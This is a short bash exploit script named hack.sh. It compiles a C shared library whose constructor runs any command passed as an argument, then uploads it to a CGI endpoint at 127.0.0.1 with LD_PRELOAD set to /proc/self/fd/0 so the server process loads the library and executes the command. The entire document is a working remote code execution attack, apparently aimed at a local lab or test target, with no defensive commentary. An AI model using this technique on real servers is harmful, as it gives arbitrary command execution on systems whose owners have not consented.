#!/bin/bash

set -x
cmd=$1

if [[ -z "$cmd" ]]; then
    echo Usage: hack.sh command_to_execute
    exit
fi

cat > payload.c << EOF
void __attribute__ ((constructor)) setup ()
{
	unsetenv("LD_PRELOAD");
	
    system("COMMAND_TO_EXECUTE");
    write(1, "Hello: World!\n", 14);
}
EOF

sed -i "s#COMMAND_TO_EXECUTE#$cmd#" payload.c
gcc -fPIC -shared payload.c -o payload.so

curl -i -X POST --data-binary @payload.so "http://127.0.0.1/cgi-bin/cgitest?LD_PRELOAD=/proc/self/fd/0"
rm -f payload.c payload.so
